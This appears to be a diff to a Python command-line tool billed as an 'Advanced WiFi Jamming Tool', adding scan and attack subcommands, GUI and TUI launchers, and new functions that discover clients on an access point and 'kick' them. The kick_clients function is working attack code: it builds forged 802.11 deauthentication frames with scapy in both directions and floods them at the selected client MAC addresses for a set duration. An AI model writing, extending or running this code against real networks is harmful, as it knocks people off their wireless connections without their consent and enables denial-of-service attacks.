@@ -19,12 +19,13 @@ from rich.live import Live
 from rich.layout import Layout
 from rich.text import Text
 
-from .core.interfaces import AttackType, AttackConfig
-from .core.platform_interface import PlatformInterfaceFactory
-from .scanner import ScapyNetworkScanner
-from .factory import AttackFactory
-from .utils import RichLogger
-from .utils.warning_suppressor import setup_warning_suppression
+from wifi_jammer.core.interfaces import AttackType, AttackConfig
+from wifi_jammer.core.platform_interface import PlatformInterfaceFactory
+from wifi_jammer.scanner import ScapyNetworkScanner
+from wifi_jammer.factory import AttackFactory
+from wifi_jammer.utils import RichLogger
+from wifi_jammer.utils.warning_suppressor import setup_warning_suppression
+from wifi_jammer.utils.platform_utils import is_windows, is_unix_like, get_root_status
 
 
 # Setup warning suppression
@@ -105,10 +106,8 @@ class WiFiJammerCLI:
         self.live_display = None
     
     def check_root(self):
-        """Check if running as root."""
-        import platform
-        
-        if platform.system() == "Windows":
+        """Check if running as root. Returns True if root, False otherwise (warns but doesn't exit)."""
+        if is_windows():
             # Windows - check for admin privileges
             try:
                 import ctypes
@@ -116,13 +115,14 @@ class WiFiJammerCLI:
                     self.logger.warning("Some features may require administrator privileges on Windows.")
                     return False
                 return True
-            except:
+            except (AttributeError, OSError, ImportError):
                 self.logger.warning("Could not check Windows privileges.")
                 return False
         else:
             # Unix-like systems
             if os.geteuid() != 0:
-                self.logger.warning("Some features require root privileges. Run with sudo for full functionality.")
+                self.logger.warning("⚠️  Some features require root privileges. Run with sudo for full functionality.")
+                self.logger.info("   Note: Network scanning may work without root, but attacks typically require root.")
                 return False
             return True
     
@@ -298,6 +298,122 @@ class WiFiJammerCLI:
         
         return config
     
+    def discover_clients(self, interface, ap_bssid, channel, duration=30):
+        """Discover clients connected to the AP."""
+        # Get user's MAC to exclude
+        import subprocess
+        import re
+        try:
+            result = subprocess.run(['ifconfig', interface], capture_output=True, text=True, timeout=5)
+            mac_match = re.search(r'ether\s+([0-9a-fA-F:]+)', result.stdout)
+            my_mac = mac_match.group(1) if mac_match else None
+        except (subprocess.TimeoutExpired, subprocess.CalledProcessError,
+                FileNotFoundError, OSError, AttributeError):
+            my_mac = None
+        
+        # Use scanner's client scanning method
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(),
+            TimeElapsedColumn(),
+            console=self.console
+        ) as progress:
+            task = progress.add_task(f"Scanning for {duration}s...", total=duration)
+            
+            def update_progress():
+                for _ in range(duration):
+                    time.sleep(1)
+                    progress.update(task, advance=1)
+            
+            progress_thread = threading.Thread(target=update_progress)
+            progress_thread.start()
+            
+            # Use scanner's scan_clients method
+            clients = self.scanner.scan_clients(interface, ap_bssid, channel, duration)
+            progress_thread.join()
+        
+        return clients, my_mac
+    
+    def select_clients_to_kick(self, clients):
+        """Let user select which clients to kick."""
+        if not clients:
+            self.logger.warning("No clients discovered")
+            return []
+        
+        # Display discovered clients
+        table = Table(title=f"Discovered Clients ({len(clients)})")
+        table.add_column("#", style="cyan")
+        table.add_column("MAC Address", style="yellow")
+        table.add_column("Last Seen", style="green")
+        
+        client_list = list(clients.items())
+        for i, (mac, last_seen) in enumerate(client_list, 1):
+            age = time.time() - last_seen
+            table.add_row(str(i), mac, f"{age:.1f}s ago")
+        
+        self.console.print(table)
+        
+        self.console.print("\n[bold]Kick Options:[/bold]")
+        self.console.print("  [cyan]all[/cyan] - Kick all discovered clients")
+        self.console.print("  [cyan]1,2,3[/cyan] - Kick specific clients (comma-separated)")
+        self.console.print("  [cyan]none[/cyan] - Skip client kicking")
+        
+        selection = Prompt.ask("Select clients to kick", default="all")
+        
+        if selection.lower() == "none":
+            return []
+        elif selection.lower() == "all":
+            return [mac for mac, _ in client_list]
+        else:
+            try:
+                indices = [int(x.strip()) - 1 for x in selection.split(',')]
+                return [client_list[i][0] for i in indices if 0 <= i < len(client_list)]
+            except (ValueError, IndexError):
+                self.logger.error("Invalid selection")
+                return []
+    
+    def kick_clients(self, interface, ap_bssid, target_clients, duration=60):
+        """Kick specific clients using deauth packets."""
+        from scapy.all import sendp, RadioTap
+        from scapy.layers.dot11 import Dot11, Dot11Deauth
+        
+        if not target_clients:
+            return
+        
+        self.logger.info(f"Kicking {len(target_clients)} clients for {duration} seconds...")
+        self.console.print("[yellow]Press Ctrl+C to stop early[/yellow]")
+        
+        start_time = time.time()
+        count = 0
+        
+        try:
+            with Live(self.console.status("[bold green]Sending deauth packets..."), console=self.console) as live:
+                while time.time() - start_time < duration:
+                    for target_mac in target_clients:
+                        # Bidirectional deauth
+                        pkt_to_client = (RadioTap() / 
+                                        Dot11(addr1=target_mac, addr2=ap_bssid, addr3=ap_bssid) / 
+                                        Dot11Deauth(reason=7))
+                        
+                        pkt_to_ap = (RadioTap() / 
+                                    Dot11(addr1=ap_bssid, addr2=target_mac, addr3=ap_bssid) / 
+                                    Dot11Deauth(reason=7))
+                        
+                        sendp(pkt_to_client, iface=interface, verbose=False)
+                        sendp(pkt_to_ap, iface=interface, verbose=False)
+                        count += 2
+                    
+                    if count % 50 == 0:
+                        elapsed = time.time() - start_time
+                        live.update(f"[bold green]Sent {count} packets to {len(target_clients)} clients ({elapsed:.1f}s)")
+                    
+                    time.sleep(0.1)
+        except KeyboardInterrupt:
+            self.logger.info("Stopped by user")
+        
+        self.logger.success(f"Attack complete. Sent {count} deauth packets")
+    
     def progress_callback(self, stats):
         """Callback for progress updates."""
         if self.progress_display:
@@ -346,34 +462,136 @@ class WiFiJammerCLI:
         sys.exit(0)
 
 
-@click.command()
-@click.option('--interface', '-i', help='Wireless interface to use')
-@click.option('--target', '-t', help='Target BSSID')
-@click.option('--attack', '-a', type=click.Choice([at.value for at in AttackType]), help='Attack type')
-@click.option('--count', '-c', default=0, help='Number of packets to send (0 for unlimited)')
-@click.option('--delay', '-d', default=0.1, help='Delay between packets in seconds')
-@click.option('--channel', '-ch', type=int, help='Channel to use')
+@click.group(invoke_without_command=True)
 @click.option('--verbose', '-v', is_flag=True, help='Verbose output')
-@click.option('--scan-only', is_flag=True, help='Only scan networks, don\'t attack')
-def main(interface, target, attack, count, delay, channel, verbose, scan_only):
+@click.option('--gui', is_flag=True, help='Launch Qt GUI')
+@click.option('--tui', is_flag=True, help='Launch modern TUI')
+@click.pass_context
+def cli(ctx, verbose, gui, tui):
     """Advanced WiFi Jamming Tool - By Paijo"""
+    ctx.ensure_object(dict)
+    ctx.obj['verbose'] = verbose
+    ctx.obj['tui'] = tui
+    ctx.obj['gui'] = gui
     
-    cli = WiFiJammerCLI()
+    # Launch GUI if requested (works standalone or with commands)
+    if gui:
+        try:
+            from wifi_jammer.gui import launch_gui
+            sys.exit(launch_gui())
+        except ImportError as e:
+            console = Console()
+            console.print(
+                "[red]GUI not available. Install PyQt6:[/red] "
+                "[cyan]pip install PyQt6[/cyan]"
+            )
+            console.print(f"[red]Error: {e}[/red]")
+            sys.exit(1)
     
-    # Check root privileges
-    if not cli.check_root():
-        sys.exit(1) # Exit if root privileges are not available
+    # Launch TUI if requested (works standalone or with commands)
+    if tui:
+        try:
+            from wifi_jammer.tui import WiFiJammerApp
+            from wifi_jammer.core.platform_interface import PlatformInterfaceFactory
+            
+            # Get interface selection
+            platform_interface = PlatformInterfaceFactory.create()
+            wireless_interfaces = platform_interface.get_wireless_interfaces()
+            available_interfaces = [iface.name for iface in wireless_interfaces 
+                                  if iface.status == "Available"]
+            
+            if not available_interfaces:
+                console = Console()
+                console.print("[red]No available wireless interfaces found![/red]")
+                sys.exit(1)
+            
+            # Use first available interface or let TUI handle selection
+            interface = available_interfaces[0] if available_interfaces else None
+            app = WiFiJammerApp(interface)
+            sys.exit(app.run())
+        except ImportError as e:
+            console = Console()
+            console.print(
+                "[red]TUI not available. Install textual:[/red] "
+                "[cyan]pip install textual[/cyan]"
+            )
+            console.print(f"[red]Error: {e}[/red]")
+            sys.exit(1)
+        except Exception as e:
+            console = Console()
+            console.print(f"[red]Error launching TUI: {e}[/red]")
+            sys.exit(1)
+    
+    # If no command and no gui/tui flag, show help
+    if ctx.invoked_subcommand is None:
+        click.echo(ctx.get_help())
+
+
+@cli.command()
+@click.option('--interface', '-i', help='Wireless interface to use')
+@click.option('--channel', '-ch', type=int, help='Channel to scan')
+@click.option('--gui', is_flag=True, help='Launch Qt GUI')
+@click.option('--tui', is_flag=True, help='Launch modern TUI')
+@click.pass_context
+def scan(ctx, interface, channel, gui, tui):
+    """Scan for available WiFi networks."""
+    # Check if GUI or TUI was requested (group level or command level)
+    if ctx.obj.get('gui', False) or gui:
+        try:
+            from wifi_jammer.gui import launch_gui
+            sys.exit(launch_gui())
+        except ImportError as e:
+            console = Console()
+            console.print(
+                "[red]GUI not available. Install PyQt6:[/red] "
+                "[cyan]pip install PyQt6[/cyan]"
+            )
+            console.print(f"[red]Error: {e}[/red]")
+            sys.exit(1)
+    
+    if ctx.obj.get('tui', False) or tui:
+        try:
+            from wifi_jammer.tui import WiFiJammerApp
+            from wifi_jammer.core.platform_interface import PlatformInterfaceFactory
+            
+            platform_interface = PlatformInterfaceFactory.create()
+            wireless_interfaces = platform_interface.get_wireless_interfaces()
+            available_interfaces = [iface.name for iface in wireless_interfaces 
+                                  if iface.status == "Available"]
+            
+            if not available_interfaces:
+                console = Console()
+                console.print("[red]No available wireless interfaces found![/red]")
+                sys.exit(1)
+            
+            interface = interface if interface else (available_interfaces[0] if available_interfaces else None)
+            app = WiFiJammerApp(interface)
+            sys.exit(app.run())
+        except ImportError as e:
+            console = Console()
+            console.print(
+                "[red]TUI not available. Install textual:[/red] "
+                "[cyan]pip install textual[/cyan]"
+            )
+            console.print(f"[red]Error: {e}[/red]")
+            sys.exit(1)
+        except Exception as e:
+            console = Console()
+            console.print(f"[red]Error launching TUI: {e}[/red]")
+            sys.exit(1)
+    
+    cli_obj = WiFiJammerCLI()
     
     # Show banner
-    cli.show_banner()
+    cli_obj.show_banner()
     
     # Set up signal handlers
-    signal.signal(signal.SIGINT, cli.signal_handler)
-    signal.signal(signal.SIGTERM, cli.signal_handler)
+    signal.signal(signal.SIGINT, cli_obj.signal_handler)
+    signal.signal(signal.SIGTERM, cli_obj.signal_handler)
     
     try:
         # List interfaces
-        interfaces = cli.list_interfaces()
+        interfaces = cli_obj.list_interfaces()
         if not interfaces:
             return
         
@@ -382,33 +600,228 @@ def main(interface, target, attack, count, delay, channel, verbose, scan_only):
             interface = Prompt.ask("Select interface", choices=interfaces, default=interfaces[0])
         
         # Scan networks
-        networks = cli.scan_networks(interface, channel)
-        cli.display_networks(networks)
+        networks = cli_obj.scan_networks(interface, channel)
+        cli_obj.display_networks(networks)
         
-        if scan_only:
+    except KeyboardInterrupt:
+        cli_obj.logger.info("Operation cancelled by user")
+    except Exception as e:
+        cli_obj.logger.error(f"Unexpected error: {e}")
+
+
+@cli.command()
+@click.option('--interface', '-i', help='Wireless interface to use')
+@click.option('--target', '-t', help='Target BSSID')
+@click.option('--attack', '-a', type=click.Choice([at.value for at in AttackType]), help='Attack type')
+@click.option('--count', '-c', default=0, help='Number of packets to send (0 for unlimited)')
+@click.option('--delay', '-d', default=0.1, help='Delay between packets in seconds')
+@click.option('--channel', '-ch', type=int, help='Channel to use')
+@click.option('--gui', is_flag=True, help='Launch Qt GUI')
+@click.option('--tui', is_flag=True, help='Launch modern TUI')
+@click.pass_context
+def attack(ctx, interface, target, attack, count, delay, channel, gui, tui):
+    """Launch attack on a WiFi network."""
+    # Check if GUI was requested (group level or command level)
+    if ctx.obj.get('gui', False) or gui:
+        try:
+            from wifi_jammer.gui import launch_gui
+            sys.exit(launch_gui())
+        except ImportError as e:
+            console = Console()
+            console.print(
+                "[red]GUI not available. Install PyQt6:[/red] "
+                "[cyan]pip install PyQt6[/cyan]"
+            )
+            console.print(f"[red]Error: {e}[/red]")
+            sys.exit(1)
+    
+    # Check if TUI was requested (group level or command level)
+    if ctx.obj.get('tui', False) or tui:
+        try:
+            from wifi_jammer.tui import WiFiJammerApp
+            from wifi_jammer.core.platform_interface import PlatformInterfaceFactory
+            
+            # Get interface selection
+            platform_interface = PlatformInterfaceFactory.create()
+            wireless_interfaces = platform_interface.get_wireless_interfaces()
+            available_interfaces = [iface.name for iface in wireless_interfaces 
+                                  if iface.status == "Available"]
+            
+            if not available_interfaces:
+                console = Console()
+                console.print("[red]No available wireless interfaces found![/red]")
+                sys.exit(1)
+            
+            # Use provided interface or first available
+            selected_interface = interface if interface else available_interfaces[0]
+            app = WiFiJammerApp(selected_interface)
+            sys.exit(app.run())
+        except ImportError as e:
+            console = Console()
+            console.print(
+                "[red]TUI not available. Install textual:[/red] "
+                "[cyan]pip install textual[/cyan]"
+            )
+            console.print(f"[red]Error: {e}[/red]")
+            sys.exit(1)
+        except Exception as e:
+            console = Console()
+            console.print(f"[red]Error launching TUI: {e}[/red]")
+            sys.exit(1)
+    
+    cli_obj = WiFiJammerCLI()
+    
+    # Check root privileges (warn but don't exit - some features may work without root)
+    cli_obj.check_root()
+    
+    # Show banner
+    cli_obj.show_banner()
+    
+    # Set up signal handlers
+    signal.signal(signal.SIGINT, cli_obj.signal_handler)
+    signal.signal(signal.SIGTERM, cli_obj.signal_handler)
+    
+    try:
+        # List interfaces
+        interfaces = cli_obj.list_interfaces()
+        if not interfaces:
             return
         
-        # Select target network
-        target_network = cli.select_network(networks)
-        if not target_network:
-            return
-        
+        # Select interface if not provided
+        if not interface:
+            interface = Prompt.ask("Select interface", choices=interfaces, default=interfaces[0])
+
         # Select attack type
         if not attack:
-            attack_type = cli.select_attack()
+            attack_type = cli_obj.select_attack()
         else:
             attack_type = AttackType(attack)
         
-        # Configure attack
-        config = cli.configure_attack(attack_type)
+        # If target BSSID is provided, skip network scanning and use it directly
+        if target:
+            # Validate target BSSID format
+            from wifi_jammer.utils.validators import is_valid_bssid
+            if not is_valid_bssid(target):
+                cli_obj.logger.error(f"Invalid target BSSID format: {target}")
+                cli_obj.logger.info("BSSID format should be: XX:XX:XX:XX:XX:XX (hexadecimal)")
+                return
+            
+            # Validate interface if provided
+            if interface and not is_valid_interface_name(interface):
+                cli_obj.logger.error(f"Invalid interface name: {interface}")
+                return
+            
+            # Validate channel if provided
+            if channel and not is_valid_channel(channel):
+                cli_obj.logger.error(f"Invalid channel: {channel}. Must be 1-14 (2.4GHz) or 36-165 (5GHz)")
+                return
+            
+            # Validate count and delay
+            if not is_valid_packet_count(count):
+                cli_obj.logger.error(f"Invalid packet count: {count}. Must be >= 0")
+                return
+            
+            if not is_valid_delay(delay):
+                cli_obj.logger.error(f"Invalid delay: {delay}. Must be between 0.0 and 60.0 seconds")
+                return
+            
+            # Create config directly from command-line parameters
+            config = AttackConfig(
+                attack_type=attack_type,
+                target_bssid=target,
+                target_ssid="",  # Not provided via CLI
+                interface=interface,
+                channel=channel if channel else 0,
+                count=count,
+                delay=delay,
+                source_mac="",  # Will be random if not provided
+                verbose=ctx.obj.get('verbose', False)
+            )
+            
+            # Final validation
+            is_valid, error_msg = validate_attack_config(config)
+            if not is_valid:
+                cli_obj.logger.error(f"Invalid attack configuration: {error_msg}")
+                return
+            
+            cli_obj.logger.info(f"Using provided target: {target}")
+            if channel:
+                cli_obj.logger.info(f"Using channel: {channel}")
+            else:
+                cli_obj.logger.warning("No channel specified. Attack may not work correctly on some interfaces.")
+        else:
+            # Interactive mode: scan and select network
+            networks = cli_obj.scan_networks(interface, channel)
+            cli_obj.display_networks(networks)
+            
+            # Select target network
+            target_network = cli_obj.select_network(networks)
+            if not target_network:
+                return
+            
+            # Configure attack (interactive)
+            config = cli_obj.configure_attack(attack_type)
+            # Override with provided CLI values if any
+            if interface:
+                config.interface = interface
+            if channel:
+                config.channel = channel
+            if count is not None:
+                config.count = count
+            if delay is not None:
+                config.delay = delay
+            config.verbose = ctx.obj.get('verbose', False)
+        
+        # Ask if user wants to discover and kick specific clients (only in interactive mode)
+        if not target and attack_type in [AttackType.DEAUTH, AttackType.DISASSOC]:
+            discover = Confirm.ask("\n[bold cyan]Do you want to discover connected clients first?[/bold cyan]", default=False)
+            
+            if discover:
+                # Discover clients (using config values)
+                clients, my_mac = cli_obj.discover_clients(
+                    interface=config.interface,
+                    ap_bssid=config.target_bssid,
+                    channel=config.channel,
+                    duration=30
+                )
+                
+                if clients:
+                    # Let user select which clients to kick
+                    target_clients = cli_obj.select_clients_to_kick(clients)
+                    
+                    if target_clients:
+                        # Ask for kick duration
+                        duration = Prompt.ask("\n[bold]Kick duration in seconds[/bold]", default="60")
+                        try:
+                            duration = int(duration)
+                        except ValueError:
+                            duration = 60
+                        
+                        # Kick selected clients
+                        cli_obj.kick_clients(
+                            interface=config.interface,
+                            ap_bssid=config.target_bssid,
+                            target_clients=target_clients,
+                            duration=duration
+                        )
+                        
+                        # Ask if user wants to continue with regular attack
+                        continue_attack = Confirm.ask("\n[bold]Continue with regular attack?[/bold]", default=False)
+                        if not continue_attack:
+                            return
         
         # Start attack
-        cli.start_attack(config)
+        cli_obj.start_attack(config)
         
     except KeyboardInterrupt:
-        cli.logger.info("Operation cancelled by user")
+        cli_obj.logger.info("Operation cancelled by user")
     except Exception as e:
-        cli.logger.error(f"Unexpected error: {e}")
+        cli_obj.logger.error(f"Unexpected error: {e}")
+
+
+def main():
+    """Main entry point for CLI."""
+    cli()
 
 
 if __name__ == "__main__":
